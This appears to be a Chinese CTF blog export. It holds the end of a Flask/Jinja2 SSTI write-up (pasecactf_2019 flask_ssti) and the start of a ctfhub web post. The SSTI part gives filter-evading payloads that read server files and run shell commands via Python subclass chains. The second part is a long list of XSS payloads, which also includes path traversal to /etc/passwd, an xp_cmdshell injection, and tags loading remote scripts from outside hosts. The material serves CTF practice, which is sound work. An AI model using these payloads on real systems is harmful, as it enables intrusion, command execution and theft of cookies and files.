class="string">&#x27;traceback&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">19</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">20</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">21</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">22</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">23</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">24</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">25</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">26</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">27</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">28</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">29</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">30</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">31</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">32</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">33</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">34</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">35</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">36</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">37</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">44</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">45</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">46</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">47</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">48</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">49</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">50</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">51</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">52</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.getwindowsversion&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">53</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">54</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">55</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">56</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">57</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;nt.stat_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">58</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;nt.statvfs_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">60</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">61</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">62</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">63</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">64</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">65</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">66</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">67</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">68</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">69</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">70</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">71</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">73</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">74</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">75</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">76</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">78</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">79</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">80</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">81</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">82</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">83</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">84</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteCodec&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">85</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteIncrementalEncoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">86</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteIncrementalDecoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">87</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteStreamReader&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">88</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteStreamWriter&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>file的标号为40，所以用下面的payload可以读取文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;F:/file.txt&quot;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="2-python3读取文件与命令执行"><a href="#2-python3读取文件与命令执行" class="headerlink" title="2.python3读取文件与命令执行"></a>2.python3读取文件与命令执行</h2><p>这里以一道ctf题目作为实例分析一下。</p><h3 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;f://file.txt&#x27;</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">169</span>].__init__.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/root/1.txt&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>[][“<strong>class</strong>“][“<strong>base</strong>“]<strong>subclasses</strong>()<br>[][“\x5f\x5fclass\x5f\x5f”][“\x5f\x5fbases\x5f\x5f”]\x5f\x5fsubclasses\x5f\x5f()</p><p><code>&#123;&#123;[]["\x5f\x5fclass\x5f\x5f"]&#125;&#125;</code><br><code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]&#125;&#125;</code><br><code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()&#125;&#125;</code><br>此时为<br><code>[].__classes__.__bases__[0].__subclasses__()</code>查看可用子类。</p><p>找到<code>warnings.catch_warnings</code>模块为132号<br><code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[132]&#125;&#125;</code></p><p>然后<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.func_globals.keys()&#125;&#125;</code><br>即<code>&#123;&#123;[]["\x5f\x5fcla"+"ss\x5f\x5f"]["\x5f\x5fba"+"ses\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[132]["\x5f\x5finit\x5f\x5f"]["func\x5fglobals"]["keys"]()&#125;&#125;</code><br>走到这步不行了，换种方法试一下。</p><p><strong>另一种方法</strong><br>另一种payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__classes__.__bases__[0].__subclasses__()[80].load_moudle(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[80][&quot;load\x5Fmodule&quot;](&quot;os&quot;)[&quot;system&quot;](&quot;ls&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中[80]指的是<code>_frozen_importlib.BuiltinImporter</code>，太强了。这样我们不会得到输出，但我们可以借助外部VPS，wget一个文件。 然后我们得到app.py，读文件。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[91].get_data(0, &quot;app.py&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0, &quot;app\x2Epy&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>就可以得到app.py文件内容。反推flag即可。<br>这里得到<code>os.remove(&quot;/app/flag&quot;)</code>，什么？flag文件又给删除了？再次读文件<code>/proc/self/fd/3</code>也不是第一次用到了，换payload得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0,&quot;/proc/self/fd/3&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>91模块是<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code>，里面有读文件的方法<code>get_data(0, &quot;文件名&quot;)</code>，猜测应为这种格式，不是很清楚然后就能读文件了。python太杂了，<del>呜呜呜</del></p></blockquote><p><code>flag&#123;d71e1b5f-c027-47a0-a467-504e83d5d002&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub技能树web</title>
      <link href="/2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web/"/>
      <url>/2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web/</url>
      
        <content type="html"><![CDATA[<p><del><strong>搞他</strong></del></p><h1 id="1-xss"><a href="#1-xss" class="headerlink" title="1.xss"></a>1.xss</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> =&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(vulnerable)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> %3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> %0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(\&quot;Vulnerable\&quot;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line"> %22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"> %2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line"> %3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> %3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> %3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"> %3f.jsp</span><br><span class="line"> %3f.jsp</span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> ?sql_debug=1</span><br><span class="line"> a%5c.aspx</span><br><span class="line"> a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> a/</span><br><span class="line"> a?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> &quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> &#x27;;exec%20master..xp_cmdshell%20&#x27;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#x27;--&amp;&amp;</span><br><span class="line"> %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line"> %3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line"> %3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> &quot;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">java\0script:alert(\</span>&quot;<span class="attr">XSS</span>\&quot;)&gt;</span>&quot;;&#x27; &gt; out</span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot; javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript">a=<span class="regexp">/XSS/</span><span class="title function_">alert</span>(a.<span class="property">source</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;mocha:[code]&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;livescript:[code]&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>alert(&#x27;XSS&#x27;);<span class="tag">&lt;/<span 